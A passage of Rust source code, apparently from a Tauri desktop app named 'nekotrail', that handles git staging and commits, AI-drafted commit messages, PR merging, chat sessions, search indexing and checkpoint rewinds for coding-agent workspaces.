    git::git(dir, &["add", "-A"]).map_err(e)?;
    if git::git(dir, &["diff", "--cached", "--quiet"]).is_err() {
        git::git(dir, &["commit", "-q", "-m", &msg]).map_err(e)?;
    }
    git::git(dir, &["push", "-u", "origin", &ws.branch]).map_err(e)?;
    pr_poke(&st, Some(&ws.repo_id), true);
    Ok(msg)
}

// ---------- the commit composer (Changes, Commit) ----------

/// Is any chat in this workspace running a turn right now?
fn agent_busy(st: &AppState, workspace_id: &str) -> bool {
    let ids: Vec<String> = st.db().sessions(workspace_id).unwrap_or_default().into_iter().map(|s| s.id).collect();
    let runs = st.runs.lock().unwrap();
    ids.iter().any(|i| runs.running.contains_key(i))
}

/// Ask the workspace's agent one question in a throwaway turn: a fresh conversation (never the
/// chat's own session, so nothing lands in the chat or its context), read-only, no repo prompt,
/// stopped after `secs`. Uses the newest chat's agent, model and effort; Claude if there is none.
/// Returns everything the agent wrote.
fn side_turn(st: &AppState, ws: &Workspace, prompt: &str, secs: u64) -> Res<String> {
    use std::io::Write;
    use std::sync::atomic::{AtomicBool, Ordering};
    let repo = st.db().repo(&ws.repo_id).map_err(e)?;
    let last = st.db().sessions(&ws.id).unwrap_or_default().pop();
    let agent_id = last.as_ref().map(|s| s.agent.clone()).unwrap_or_else(|| "claude".into());
    let harness = agent::get(&agent_id);
    let project_config = untrusted_agent_config(st, ws, harness).is_none();
    if !project_config && let Some(why) = harness.needs_trusted_config() {
        return Err(why);
    }
    let env = env_for(st, &repo, ws);
    let spec = agent::TurnSpec {
        fork: false,
        agent: &agent_id,
        prompt,
        agent_session_id: None,
        model: last.as_ref().and_then(|s| s.model.as_deref()),
        permission_mode: "plan",
        cwd: Path::new(&ws.path),
        effort: last.as_ref().and_then(|s| s.effort.as_deref()),
        instructions: None,
        env: &env,
        dirs: &[],
        project_config,
        guard: None,
    };
    let mut cmd = agent::command(&spec);
    let mut parser = agent::parser(&spec);
    cmd.stdout(Stdio::piped()).stderr(Stdio::piped());
    let mut child = cmd.spawn().map_err(|err| format!("Couldn't start {agent_id}: {err}"))?;
    let pid = child.id();
    let done = Arc::new(AtomicBool::new(false));
    let timed_out = Arc::new(AtomicBool::new(false));
    {
        let (done, timed_out) = (done.clone(), timed_out.clone());
        std::thread::spawn(move || {
            let until = std::time::Instant::now() + std::time::Duration::from_secs(secs);
            while std::time::Instant::now() < until {
                if done.load(Ordering::Relaxed) {
                    return;
                }
                std::thread::sleep(std::time::Duration::from_millis(200));
            }
            if !done.load(Ordering::Relaxed) {
                timed_out.store(true, Ordering::Relaxed);
                let _ = Command::new("kill").args(["-TERM", &pid.to_string()]).status();
            }
        });
    }
    let mut stdin = if harness.interactive("plan") { child.stdin.take() } else { None };
    let send = |stdin: &mut Option<std::process::ChildStdin>, lines: &[String]| {
        if let Some(s) = stdin.as_mut() {
            for l in lines {
                let _ = s.write_all(l.as_bytes());
            }
            let _ = s.flush();
        }
    };
    if let Some(first) = harness.first_input(prompt).filter(|_| stdin.is_some()) {
        send(&mut stdin, &[first]);
    }
    let first = parser.outgoing();
    send(&mut stdin, &first);
    let stderr = child.stderr.take();
    let err_buf = Arc::new(Mutex::new(String::new()));
    {
        let err_buf = err_buf.clone();
        std::thread::spawn(move || {
            if let Some(s) = stderr {
                for line in BufReader::new(s).lines().map_while(Result::ok) {
                    let mut b = err_buf.lock().unwrap();
                    if b.len() < 4000 {
                        b.push_str(&line);
                        b.push('\n');
                    }
                }
            }
        });
    }
    let mut said = String::new();
    let mut failed: Option<String> = None;
    let stdout = child.stdout.take().ok_or("The agent has no output.")?;
    let lines = BufReader::new(stdout).lines().map_while(Result::ok).map(Some).chain(std::iter::once(None));
    for line in lines {
        let events = match &line {
            Some(l) => parser.line(l),
            None => parser.finish(),
        };
        let out = parser.outgoing();
        send(&mut stdin, &out);
        for ev in events {
            match ev["kind"].as_str() {
                Some("text") => {
                    if let Some(t) = ev["text"].as_str() {
                        said.push_str(t);
                        said.push('\n');
                    }
                }
                // A side question never edits or runs anything: every request is refused.
                Some("approval") => {
                    if let Some(Ok(reply)) = ev["request_id"].as_str().and_then(|rid| parser.answer(rid, false, false)) {
                        send(&mut stdin, &[reply]);
                    }
                }
                Some("error") => failed = ev["text"].as_str().map(str::to_string),
                _ => {}
            }
        }
        if parser.finished() || line.as_deref().is_some_and(|l| l.contains("\"type\":\"result\"")) {
            stdin = None;
        }
    }
    drop(stdin);
    let _ = child.wait();
    done.store(true, Ordering::Relaxed);
    if timed_out.load(Ordering::Relaxed) {
        return Err(format!("{} took longer than {secs} seconds", agent::get(&agent_id).id()));
    }
    let said = said.trim().to_string();
    if said.is_empty() {
        let why = failed.unwrap_or_else(|| err_buf.lock().unwrap().trim().lines().last().unwrap_or("").to_string());
        return Err(if why.is_empty() { "the agent gave no answer".into() } else { why });
    }
    Ok(said)
}

/// Staged and unstaged files, each marked when the repo protects it.
#[tauri::command]
async fn stage_status(app: AppHandle, id: String) -> Res<stage::StageStatus> {
    blocking(app, move |st| {
        let ws = st.db().workspace(&id).map_err(e)?;
        let rules = st.db().repo(&ws.repo_id).map(|r| guard_rules(&r, &ws)).unwrap_or_default();
        let mut s = stage::status(Path::new(&ws.path)).map_err(e)?;
        for f in s.staged.iter_mut().chain(s.unstaged.iter_mut()) {
            f.protected = rules.protects(&f.path);
        }
        Ok(s)
    })
    .await
}

/// One file's staged or unstaged diff, with the fingerprint a line selection must send back.
#[tauri::command]
async fn stage_diff(app: AppHandle, id: String, path: String, staged: bool, old_path: Option<String>) -> Res<Value> {
    blocking(app, move |st| {
        let ws = st.db().workspace(&id).map_err(e)?;
        let d = stage::diff(Path::new(&ws.path), &path, staged, old_path.as_deref()).map_err(e)?;
        let fd = stage::parse(&d);
        Ok(json!({"text": String::from_utf8_lossy(&d), "sig": stage::sig(&d), "binary": fd.binary}))
    })
    .await
}

/// Stage (from the unstaged list) or unstage (from the staged list) one file whole, or only the
/// change lines numbered in `lines`. Only the index changes; the files on disk never do.
#[tauri::command]
async fn stage_apply(app: AppHandle, id: String, path: String, staged: bool, old_path: Option<String>, sig: Option<String>, lines: Option<Vec<usize>>) -> Res<()> {
    blocking(app, move |st| {
        let ws = st.db().workspace(&id).map_err(e)?;
        review::refuse_in_review(ws.review_pr)?;
        let dir = Path::new(&ws.path);
        let r = match (lines, staged) {
            (None, false) => stage::stage_file(dir, &path),
            (None, true) => stage::unstage_file(dir, &path, old_path.as_deref()),
            (Some(l), _) => stage::apply_lines(dir, &path, staged, old_path.as_deref(), sig.as_deref().unwrap_or(""), &l),
        };
        mark_changed(st, &ws.id);
        r.map_err(e)
    })
    .await
}

/// Stage everything, or unstage everything. Files on disk stay as they are.
#[tauri::command]
async fn stage_everything(app: AppHandle, id: String, stage: bool) -> Res<()> {
    blocking(app, move |st| {
        let ws = st.db().workspace(&id).map_err(e)?;
        review::refuse_in_review(ws.review_pr)?;
        let dir = Path::new(&ws.path);
        mark_changed(st, &ws.id);
        if stage {
            git::git(dir, &["add", "-A"]).map(|_| ()).map_err(e)
        } else if git::git(dir, &["rev-parse", "--verify", "--quiet", "HEAD"]).is_ok() {
            git::git(dir, &["reset", "-q"]).map(|_| ()).map_err(e)
        } else {
            git::git(dir, &["rm", "--cached", "-r", "-q", "--ignore-unmatch", "."]).map(|_| ()).map_err(e)
        }
    })
    .await
}

/// The last commit, and why Amend and Undo are off when they are.
#[tauri::command]
async fn head_commit(app: AppHandle, id: String) -> Res<Option<stage::HeadInfo>> {
    blocking(app, move |st| {
        let ws = st.db().workspace(&id).map_err(e)?;
        stage::head_info(Path::new(&ws.path), &ws.target_branch).map_err(e)
    })
    .await
}

/// Commit what is staged, or amend the last commit with it (refused once that commit is pushed).
#[tauri::command]
async fn commit_staged(app: AppHandle, id: String, message: String, amend: bool) -> Res<String> {
    blocking(app, move |st| {
        let ws = st.db().workspace(&id).map_err(e)?;
        review::refuse_in_review(ws.review_pr)?;
        let r = stage::commit(Path::new(&ws.path), &message, amend, &ws.target_branch);
        mark_changed(st, &ws.id);
        r.map_err(e)
    })
    .await
}

/// Undo the last commit with a soft reset. Its changes come back staged.
#[tauri::command]
async fn undo_commit(app: AppHandle, id: String) -> Res<String> {
    blocking(app, move |st| {
        let ws = st.db().workspace(&id).map_err(e)?;
        review::refuse_in_review(ws.review_pr)?;
        let r = stage::undo(Path::new(&ws.path), &ws.target_branch);
        mark_changed(st, &ws.id);
        r.map_err(e)
    })
    .await
}

/// How long a side question may take before nekotrail gives up on it.
const SIDE_TURN_SECS: u64 = 120;

/// "Draft message": the workspace's agent writes a commit message for the staged diff in a side
/// turn. When the agent is busy or can't answer, the message comes from the file list instead,
/// and `note` says so. Returns {message, source: "agent" | "local", note}.
#[tauri::command]
async fn draft_commit_message(app: AppHandle, id: String) -> Res<Value> {
    blocking(app, move |st| {
        let ws = st.db().workspace(&id).map_err(e)?;
        review::refuse_in_review(ws.review_pr)?;
        let dir = Path::new(&ws.path);
        let staged = stage::status(dir).map_err(e)?.staged;
        if staged.is_empty() {
            return Err("Nothing is staged yet. Stage the changes this commit is for, then draft its message.".into());
        }
        let local = |note: String| json!({"message": stage::local_message(&staged), "source": "local", "note": note});
        if agent_busy(st, &ws.id) {
            return Ok(local("The agent is busy, so this draft comes from the file list.".into()));
        }
        let stat = git::git(dir, &["diff", "--cached", "-M", "--stat=200"]).unwrap_or_default();
        let diff = git::git(dir, &["diff", "--cached", "-M", "--no-color", "--no-ext-diff"]).unwrap_or_default();
        match side_turn(st, &ws, &stage::draft_prompt(&stat, &diff), SIDE_TURN_SECS) {
            Ok(reply) => {
                let message = stage::clean_reply(&reply);
                if message.is_empty() { Ok(local("The agent's answer was empty, so this draft comes from the file list.".into())) } else { Ok(json!({"message": message, "source": "agent", "note": null})) }
            }
            Err(why) => Ok(local(format!("The agent couldn't answer ({}), so this draft comes from the file list.", why.lines().next().unwrap_or("").trim_end_matches('.')))),
        }
    })
    .await
}

/// "Split into commits": every uncommitted hunk, and the agent's proposal for which commit each
/// goes in. A busy agent or an unreadable answer falls back to one commit per top folder.
/// Returns {hunks, groups, source, note}.
#[tauri::command]
async fn split_plan(app: AppHandle, id: String) -> Res<Value> {
    blocking(app, move |st| {
        let ws = st.db().workspace(&id).map_err(e)?;
        review::refuse_in_review(ws.review_pr)?;
        let rules = st.db().repo(&ws.repo_id).map(|r| guard_rules(&r, &ws)).unwrap_or_default();
        let mut hunks = stage::split_hunks(Path::new(&ws.path)).map_err(e)?;
        if hunks.is_empty() {
            return Err("There are no uncommitted changes to split.".into());
        }
        for h in hunks.iter_mut() {
            h.protected = rules.protects(&h.path);
        }
        let local = |note: &str| json!({"hunks": hunks, "groups": stage::local_plan(&hunks), "source": "local", "note": note});
        if hunks.len() == 1 {
            return Ok(local("There's only one change, so there is nothing to split."));
        }
        if agent_busy(st, &ws.id) {
            return Ok(local("The agent is busy, so these commits are grouped by folder."));
        }
        match side_turn(st, &ws, &stage::split_prompt(&hunks), SIDE_TURN_SECS) {
            Ok(reply) => match stage::parse_plan(&reply, hunks.len()) {
                Some(groups) => Ok(json!({"hunks": hunks, "groups": groups, "source": "agent", "note": null})),
                None => Ok(local("The agent's answer wasn't a plan nekotrail could read, so these commits are grouped by folder.")),
            },
            Err(why) => Ok(local(&format!("The agent couldn't answer ({}), so these commits are grouped by folder.", why.lines().next().unwrap_or("").trim_end_matches('.')))),
        }
    })
    .await
}

#[derive(serde::Deserialize)]
struct HunkRef {
    path: String,
    key: String,
}

/// Commit one group of a split: the index goes back to HEAD, the group's hunks are staged and
/// committed. Files on disk never change. Returns the new commit's short hash.
#[tauri::command]
async fn split_commit(app: AppHandle, id: String, message: String, hunks: Vec<HunkRef>) -> Res<String> {
    blocking(app, move |st| {
        let ws = st.db().workspace(&id).map_err(e)?;
        review::refuse_in_review(ws.review_pr)?;
        let refs: Vec<(String, String)> = hunks.into_iter().map(|h| (h.path, h.key)).collect();
        let r = stage::split_commit(Path::new(&ws.path), &message, &refs);
        mark_changed(st, &ws.id);
        r.map_err(e)
    })
    .await
}

/// Merge the target branch from origin into the workspace. Returns "up-to-date", "merged" or
/// "conflicts" (left in place, for the agent or the user to resolve).
#[tauri::command]
async fn pull_target(st: State<'_, AppState>, id: String) -> Res<String> {
    let ws = st.db().workspace(&id).map_err(e)?;
    // A review stays on the PR's own code: merging the base in would change what is reviewed.
    review::refuse_in_review(ws.review_pr)?;
    mark_changed(&st, &ws.id);
    let dir = Path::new(&ws.path);
    git::merge_target(dir, &ws.target_branch).map(str::to_string).map_err(e)
}

/// Merge the workspace's PR on GitHub. `method` is squash, merge or rebase.
#[tauri::command]
async fn merge_pr(st: State<'_, AppState>, id: String, auto: Option<bool>) -> Res<()> {
    let ws = st.db().workspace(&id).map_err(e)?;
    review::refuse_in_review(ws.review_pr)?;
    let method = st.db().repo(&ws.repo_id).map(|r| r.prefs.merge_method).unwrap_or_default();
    let flag = match method.as_str() { "merge" => "--merge", "rebase" => "--rebase", _ => "--squash" };
    if auto.unwrap_or(false) {
        // GitHub merges it once the required checks pass.
        gh(&ws.path, &["pr", "merge", &ws.branch, flag, "--auto"])?;
        pr_poke(&st, Some(&ws.repo_id), true);
        return Ok(());
    }
    gh(&ws.path, &["pr", "merge", &ws.branch, flag])?;
    st.db().set_merged(&id).map_err(e)?;
    pr_poke(&st, Some(&ws.repo_id), true);
    Ok(())
}

/// The last lines of each failing check's log, for "Fix errors".
#[tauri::command]
async fn failing_logs(st: State<'_, AppState>, id: String) -> Res<String> {
    failing_logs_blocking(&st, &id)
}

fn failing_logs_blocking(st: &AppState, id: &str) -> Res<String> {
    let ws = st.db().workspace(id).map_err(e)?;
    let v: Value = match cached_pr(st, &ws).filter(|p| p.is_object()) {
        Some(pr) => pr,
        None => serde_json::from_str(&gh(&ws.path, &["pr", "view", &ws.branch, "--json", "statusCheckRollup"])?).map_err(e)?,
    };
    let mut runs: Vec<String> = vec![];
    let mut names: Vec<String> = vec![];
    for c in v["statusCheckRollup"].as_array().into_iter().flatten() {
        let res = c["conclusion"].as_str().or(c["state"].as_str()).unwrap_or("").to_uppercase();
        if !["FAILURE", "ERROR", "TIMED_OUT", "STARTUP_FAILURE"].contains(&res.as_str()) {
            continue;
        }
        names.push(c["name"].as_str().or(c["context"].as_str()).unwrap_or("check").to_string());
        let url = c["detailsUrl"].as_str().or(c["targetUrl"].as_str()).unwrap_or("");
        if let Some(run) = url.split("/actions/runs/").nth(1).and_then(|r| r.split('/').next())
            && !run.is_empty() && run.chars().all(|c| c.is_ascii_digit())
            && !runs.contains(&run.to_string()) {
                runs.push(run.to_string());
            }
    }
    let mut text = format!("Failing checks: {}\n", names.join(", "));
    for run in runs.iter().take(3) {
        if let Ok(log) = gh(&ws.path, &["run", "view", run, "--log-failed"]) {
            let lines: Vec<&str> = log.lines().collect();
            let tail = &lines[lines.len().saturating_sub(120)..];
            text.push_str(&format!("\n--- run {run}, last {} lines ---\n{}\n", tail.len(), tail.join("\n")));
        }
    }
    Ok(text)
}

/// Send a prompt to a workspace's most recent chat (making one if needed) and say which chat.
#[tauri::command]
async fn send_to_workspace(app: AppHandle, st: State<'_, AppState>, id: String, text: String) -> Res<String> {
    let sid = match st.db().sessions(&id).map_err(e)?.pop() {
        Some(s) => s.id,
        None => {
            let s = Session {
                id: new_id(), workspace_id: id.clone(), agent: "claude".into(), agent_session_id: None,
                title: "New chat".into(), model: None, permission_mode: "acceptEdits".into(), effort: None,
            };
            st.db().insert_session(&s).map_err(e)?;
            s.id
        }
    };
    let _ = app.emit("focus-session", json!({"workspace_id": id, "session_id": sid}));
    send(app, st, sid.clone(), text).await?;
    Ok(sid)
}

#[tauri::command]
async fn create_pr(st: State<'_, AppState>, id: String, title: String, body: String, draft: bool) -> Res<String> {
    let ws = st.db().workspace(&id).map_err(e)?;
    review::refuse_in_review(ws.review_pr)?;
    git::git(Path::new(&ws.path), &["push", "-u", "origin", &ws.branch]).map_err(e)?;
    let mut args = vec!["pr", "create", "--head", &ws.branch, "--base", &ws.target_branch, "--title", &title, "--body", &body];
    if draft {
        args.push("--draft");
    }
    let url = gh(&ws.path, &args)?.trim().to_string();
    pr_poke(&st, Some(&ws.repo_id), true);
    Ok(url)
}

// ---------- github ----------

/// The signed-in GitHub user (`gh auth`), or null when gh is not logged in.
#[tauri::command]
async fn github_profile(app: AppHandle) -> Res<Value> {
    blocking(app, |st| Ok(st.github.lock().unwrap().get_or_insert_with(|| {
        Command::new("gh")
            .args(["api", "user"])
            .output()
            .ok()
            .filter(|o| o.status.success())
            .and_then(|o| serde_json::from_slice::<Value>(&o.stdout).ok())
            .map(|u| json!({
                "login": u["login"], "name": u["name"], "avatar_url": u["avatar_url"],
                "html_url": u["html_url"], "public_repos": u["public_repos"], "followers": u["followers"],
            }))
            .unwrap_or(Value::Null)
    }).clone()))
    .await
}

/// GitHub facts for a repo: owner avatar, description, stars, default branch.
#[tauri::command]
async fn repo_github(app: AppHandle, id: String) -> Res<Value> {
    blocking(app, move |st| {
        let Ok(r) = st.db().repo(&id) else { return Ok(Value::Null) };
        if let Some(v) = st.repo_meta.lock().unwrap().get(&id) {
            return Ok(v.clone());
        }
        let v = gh(&r.root_path, &["repo", "view", "--json", "nameWithOwner,description,stargazerCount,url,owner,isPrivate"])
            .ok()
            .and_then(|s| serde_json::from_str::<Value>(&s).ok())
            .map(|mut v| {
                let login = v["owner"]["login"].as_str().unwrap_or_default().to_string();
                v["owner_avatar"] = json!(format!("https://github.com/{login}.png?size=64"));
                v
            })
            .unwrap_or(Value::Null);
        st.repo_meta.lock().unwrap().insert(id, v.clone());
        Ok(v)
    })
    .await
}

#[derive(Serialize)]
struct Sky {
    stars: &'static [names::Star],
    constellations: &'static [names::Constellation],
}

#[tauri::command]
fn sky() -> Sky {
    Sky { stars: names::STARS, constellations: names::CONSTELLATIONS }
}

// ---------- chats ----------

#[tauri::command]
async fn sessions(st: State<'_, AppState>, workspace_id: String) -> Res<Vec<Session>> {
    st.db().sessions(&workspace_id).map_err(e)
}

#[tauri::command]
async fn new_session(st: State<'_, AppState>, workspace_id: String, agent: String) -> Res<Session> {
    let agent = agent::get(&agent).id();
    let pref = |k: &str| st.db().setting(&format!("{agent}_{k}")).ok().flatten().filter(|v| !v.is_empty());
    let reviewing = st.db().workspace(&workspace_id).map(|w| w.review_pr > 0).unwrap_or(false);
    let s = Session {
        id: new_id(),
        workspace_id,
        agent: agent.into(),
        agent_session_id: None,
        title: "New chat".into(),
        model: pref("model"),
        // Chats in a review workspace only read (start_turn holds to that whatever is stored).
        permission_mode: if reviewing { "plan".into() } else { pref("mode").unwrap_or_else(|| "acceptEdits".into()) },
        effort: pref("effort"),
    };
    st.db().insert_session(&s).map_err(e)?;
    Ok(s)
}

#[tauri::command]
async fn update_session(st: State<'_, AppState>, id: String, title: String, model: Option<String>, permission_mode: String) -> Res<()> {
    // One lock at a time: the database mutex isn't re-entrant.
    let workspace_id = st.db().session(&id).map(|s| s.workspace_id).unwrap_or_default();
    let reviewing = st.db().workspace(&workspace_id).map(|w| w.review_pr > 0).unwrap_or(false);
    if reviewing && permission_mode != "plan" {
        return Err("Chats in a review workspace only read: someone else's PR is never changed from here.".into());
    }
    st.db().update_session_settings(&id, &title, model.as_deref().filter(|m| !m.is_empty()), &permission_mode).map_err(e)
}

/// The latest `limit` events of a chat and the total count, so a 7,000-message chat opens instantly.
#[tauri::command]
async fn session_events_tail(st: State<'_, AppState>, id: String, limit: i64) -> Res<Value> {
    let (events, total) = st.db().events_tail(&id, limit).map_err(e)?;
    Ok(json!({"events": events, "total": total}))
}

/// ⌘⇧F: every chat in every workspace (archived ones too), grouped by workspace, plus how far
/// the one-time indexing of older messages has got (null once it's done).
#[tauri::command]
async fn search_chats(st: State<'_, AppState>, query: String, filter: search::Filter) -> Res<Value> {
    let db = st.db();
    let groups = db.search(&query, &filter).map_err(e)?;
    let p = db.search_progress().map_err(e)?;
    Ok(json!({"groups": groups, "indexing": if p.finished { Value::Null } else { json!(p) }}))
}

/// Where a search hit lives: its chat (closed chats too), and its position, so the chat can load
/// enough history to scroll to it.
#[tauri::command]
async fn search_open(st: State<'_, AppState>, message_id: i64) -> Res<Value> {
    let db = st.db();
    let place = db.message_place(message_id).map_err(e)?;
    let session = db.session(&place.session_id).map_err(e)?;
    Ok(json!({"session": session, "workspace_id": place.workspace_id, "index": place.index, "total": place.total}))
}

/// Index messages stored before search existed, a batch at a time so the database lock is only
/// ever held for a few milliseconds. Tells the window how far it has got ("search-index").
fn search_backfill_loop(app: AppHandle) {
    std::thread::spawn(move || {
        // Let the window load its first snapshot before competing for the database.
        std::thread::sleep(std::time::Duration::from_millis(1500));
        let st = app.state::<AppState>();
        if st.db().search_progress().map(|p| p.finished).unwrap_or(true) {
            return;
        }
        let started = std::time::Instant::now();
        loop {
            let step = st.db().search_backfill_step(500);
            let progress = st.db().search_progress();
            if let Ok(p) = progress {
                let _ = app.emit("search-index", p);
            }
            match step {
                Ok(true) => break,
                Ok(false) => std::thread::sleep(std::time::Duration::from_millis(2)),
                Err(err) => {
                    eprintln!("search index: {err}");
                    return;
                }
            }
        }
        eprintln!("search index: older messages indexed in {:?}", started.elapsed());
    });
}

#[tauri::command]
async fn session_events(st: State<'_, AppState>, id: String) -> Res<Vec<Value>> {
    st.db().events(&id).map_err(e)
}

#[tauri::command]
async fn queued(st: State<'_, AppState>, id: String) -> Res<Vec<String>> {
    Ok(st.runs.lock().unwrap().queued.get(&id).map(|q| q.iter().cloned().collect()).unwrap_or_default())
}

#[tauri::command]
async fn clear_queue(app: AppHandle, st: State<'_, AppState>, id: String) -> Res<()> {
    st.runs.lock().unwrap().queued.remove(&id);
    let _ = app.emit("queue", json!({"session_id": id, "queued": []}));
    Ok(())
}

/// Answer a permission request from an "ask before changes" turn.
#[tauri::command]
async fn answer_approval(app: AppHandle, st: State<'_, AppState>, request_id: String, allow: bool, always: bool) -> Res<()> {
    let (sid, input, suggestions, parser) = {
        let mut runs = st.runs.lock().unwrap();
        let (sid, input, suggestions) = runs.approvals.remove(&request_id).ok_or("This request was already answered, or the turn ended.")?;
        let parser = runs.parsers.get(&sid).cloned();
        (sid, input, suggestions, parser)
    };
    // ACP agents get their protocol's reply; Claude gets its control response.
    let line = match parser.and_then(|p| p.lock().unwrap().answer(&request_id, allow, always)) {
        Some(Ok(line)) => line,
        Some(Err(why)) => {
            // Maybe still open ("Allow" when the agent only offers "for this chat"): keep it
            // answerable. A stale entry only gives the same error again and goes with the turn.
            st.runs.lock().unwrap().approvals.insert(request_id.clone(), (sid.clone(), input, suggestions));
            return Err(why);
        }
        None => agent::approval_response(&request_id, allow, &input, &suggestions, always),
    };
    if !write_stdin(&st.runs, &sid, &[line]) {
        return Err("The agent isn't waiting any more.".into());
    }
    let ev = json!({"kind": "approval_answer", "request_id": request_id, "allow": allow, "always": always});
    st.db().append_event(&sid, &ev).map_err(e)?;
    emit_event(&app, &sid, &ev);
    Ok(())
}

/// Drop one queued message (by position). Returns the remaining queue.
#[tauri::command]
async fn remove_queued(app: AppHandle, st: State<'_, AppState>, id: String, index: usize) -> Res<Vec<String>> {
    let mut runs = st.runs.lock().unwrap();
    let q = runs.queued.entry(id.clone()).or_default();
    if index < q.len() {
        q.remove(index);
    }
    let rest: Vec<String> = q.iter().cloned().collect();
    let _ = app.emit("queue", json!({"session_id": id, "queued": rest}));
    Ok(rest)
}

/// Copy a chat into a new tab that continues from the same point without changing the original.
/// Claude forks its conversation (`--fork-session`); Codex starts fresh with the history shown.
#[tauri::command]
async fn fork_session(st: State<'_, AppState>, id: String) -> Res<Session> {
    let (src, events) = {
        let db = st.db();
        (db.session(&id).map_err(e)?, db.events(&id).map_err(e)?)
    };
    let s = Session {
        id: new_id(),
        workspace_id: src.workspace_id.clone(),
        agent: src.agent.clone(),
        agent_session_id: if agent::get(&src.agent).forks() { src.agent_session_id.clone() } else { None },
        title: format!("{} (fork)", src.title),
        model: src.model.clone(),
        permission_mode: src.permission_mode.clone(),
        effort: src.effort.clone(),
    };
    {
        let db = st.db();
        db.insert_session(&s).map_err(e)?;
        // Checkpoints refer to the shared worktree, so they still work in the copy.
        db.append_events(&s.id, &events, &store::now()).map_err(e)?;
    }
    if s.agent_session_id.is_some() {
        st.runs.lock().unwrap().forks.insert(s.id.clone());
    }
    Ok(s)
}

/// Send a prompt. If the agent is busy, the prompt waits in the queue and runs next.
#[tauri::command]
async fn send(app: AppHandle, st: State<'_, AppState>, id: String, text: String) -> Res<()> {
    {
        let mut runs = st.runs.lock().unwrap();
        if runs.running.contains_key(&id) {
            let q = runs.queued.entry(id.clone()).or_default();
            q.push_back(text);
            let _ = app.emit("queue", json!({"session_id": id, "queued": q}));
            return Ok(());
        }
    }
    // Starting a turn runs git (checkpoint, branch name) and spawns the CLI.
    blocking(app.clone(), move |st| start_turn(app, st, id, text)).await
}

#[tauri::command]
async fn stop(st: State<'_, AppState>, id: String) -> Res<()> {
    let (pid, parser) = {
        let runs = st.runs.lock().unwrap();
        (runs.running.get(&id).copied(), runs.parsers.get(&id).cloned())
    };
    let Some(pid) = pid else { return Ok(()) };
    // ACP agents are asked to cancel (and given a moment); everything else gets SIGINT.
    match parser.and_then(|p| p.lock().unwrap().cancel()) {
        Some(lines) if write_stdin(&st.runs, &id, &lines) => signal_later(st.runs.clone(), id, pid, 10, "-TERM"),
        _ => {
            let _ = Command::new("kill").args(["-INT", &pid.to_string()]).status();
        }
    }
    Ok(())
}

/// The workspace a chat belongs to, refusing while any agent in it is working: a rewind under a
/// running agent would mix its next edits with the restored files.
fn idle_workspace(st: &AppState, session_id: &str, checkpoint: &str, claim: bool) -> Res<Workspace> {
    if !safe::object_id(checkpoint) {
        return Err("That checkpoint isn't valid.".into());
    }
    let ws = {
        let db = st.db();
        let s = db.session(session_id).map_err(e)?;
        db.workspace(&s.workspace_id).map_err(e)?
    };
    if !Path::new(&ws.path).exists() {
        return Err("This workspace is archived. Restore it first.".into());
    }
    if !git::is_checkpoint(Path::new(&ws.path), checkpoint) {
        return Err("This checkpoint is gone. Workspaces keep their last 50.".into());
    }
    let sessions = st.db().sessions(&ws.id).map_err(e)?;
    let mut runs = st.runs.lock().unwrap();
    if sessions.iter().any(|s| runs.running.contains_key(&s.id)) {
        return Err("An agent is still working in this workspace. Stop it first.".into());
    }
    if runs.rewinding.contains(&ws.id) {
        return Err("Files are already being rewound here.".into());
    }
    if claim {
        runs.rewinding.insert(ws.id.clone());
    }
    Ok(ws)
}

/// Which of these checkpoints can still be rewound to (the rest were pruned and collected).
#[tauri::command]
async fn live_checkpoints(st: State<'_, AppState>, id: String, checkpoints: Vec<String>) -> Res<Vec<String>> {
    let ws = st.db().workspace(&id).map_err(e)?;
    let ids: Vec<String> = checkpoints.into_iter().filter(|c| safe::object_id(c)).collect();
    if !Path::new(&ws.path).exists() {
        return Ok(vec![]);
    }
    git::existing_commits(Path::new(&ws.path), &ids).map_err(e)
}

/// What a rewind would change, for the confirm sheet: files that change and commits taken off.
#[tauri::command]
async fn checkpoint_preview(app: AppHandle, id: String, checkpoint: String) -> Res<Value> {
    blocking(app, move |st| {
        let ws = idle_workspace(st, &id, &checkpoint, false)?;
        let (files, commits) = git::checkpoint_preview(Path::new(&ws.path), &checkpoint).map_err(e)?;
        Ok(json!({"files": files, "commits": commits}))
    })
    .await
}

/// Undo every file change made since `checkpoint` (taken before one of this chat's messages).
/// The current state is saved first, so the rewind itself can be undone from the marker it leaves.
/// The agent is told on its next turn, so it does not assume its old edits still exist.
#[tauri::command]
async fn restore_checkpoint(app: AppHandle, id: String, checkpoint: String) -> Res<()> {
    blocking(app.clone(), move |st| rewind_to(&app, st, id, checkpoint)).await
}

fn rewind_to(app: &AppHandle, st: &AppState, id: String, checkpoint: String) -> Res<()> {
    let ws = idle_workspace(st, &id, &checkpoint, true)?;
    mark_changed(st, &ws.id);
    let done = git::rewind(Path::new(&ws.path), &git::checkpoint_prefix(&ws.id), &checkpoint);
    st.runs.lock().unwrap().rewinding.remove(&ws.id);
    let (undo, files) = done.map_err(e)?;
    // Name the message this went back to, or say it undid an earlier rewind.
    let events = st.db().events(&id).unwrap_or_default();
    let prompt = events.iter().find(|ev| ev["kind"] == "user" && ev["checkpoint"] == checkpoint.as_str());
    let text = match prompt {
        Some(ev) => {
            let first: String = ev["text"].as_str().unwrap_or("").lines().find(|l| !l.trim().is_empty()).unwrap_or("").chars().take(80).collect();
            format!("Rewound to before: {}", first.trim())
        }
        None if events.iter().any(|ev| ev["kind"] == "rewind" && ev["undo"] == checkpoint.as_str()) => "Rewind undone".to_string(),
        None => "Rewound files to an earlier point".to_string(),
    };
    let ev = json!({"kind": "rewind", "text": text, "undo": undo, "files": files});
    st.db().append_event(&id, &ev).map_err(e)?;
    emit_event(app, &id, &ev);
    let _ = app.emit("workspaces-changed", json!({}));
    st.runs.lock().unwrap().notes.insert(
        id,
        "[Note from nekotrail: the user rewound the workspace files to an earlier point in this chat. \
         Edits you made after that point no longer exist. Re-read files before changing them.]".into(),
    );
    Ok(())
}

/// Files in a workspace, for @-mentions in the composer.
#[tauri::command]
async fn workspace_files(st: State<'_, AppState>, id: String) -> Res<Vec<String>> {
    let ws = st.db().workspace(&id).map_err(e)?;
    git::files(Path::new(&ws.path)).map_err(e)
}

/// Save a pasted or dropped file inside the workspace (in a git-ignored folder) and return the
/// relative path, so the agent can open it like any other file.
#[tauri::command]
async fn save_attachment(st: State<'_, AppState>, id: String, name: String, bytes: Vec<u8>) -> Res<String> {
    let ws = st.db().workspace(&id).map_err(e)?;
    let root = Path::new(&ws.path);
    ensure_local_excludes(root, &[]);
    let safe: String = name.chars().map(|c| if c.is_ascii_alphanumeric() || c == '.' || c == '-' || c == '_' { c } else { '-' }).collect();
